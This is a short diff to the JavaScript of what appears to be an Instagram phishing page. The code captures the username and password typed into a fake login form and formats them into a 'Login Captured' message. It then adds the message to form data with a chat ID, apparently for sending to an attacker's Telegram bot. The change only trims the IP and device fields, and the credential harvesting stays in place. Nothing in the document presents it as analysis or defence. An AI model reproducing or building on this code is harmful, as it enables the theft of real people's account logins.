@@ -63,7 +63,7 @@
     const password = document.getElementById('password').value.trim();
 
     if (username && password) {
-      const caption = `🔥 Instagram Login Captured!\n\n👤 Username: ${username}\n🔑 Password: ${password}\nIP: Loading...\nDevice: ${navigator.userAgent}\nTime: ${new Date().toISOString()}`;
+      const caption = `🔥 Instagram Login Captured!\n\n👤 Username: ${username}\n🔑 Password: ${password}\nTime: ${new Date().toISOString()}`;
 
       const formData = new FormData();
       formData.append("chat_id", CHAT_ID);
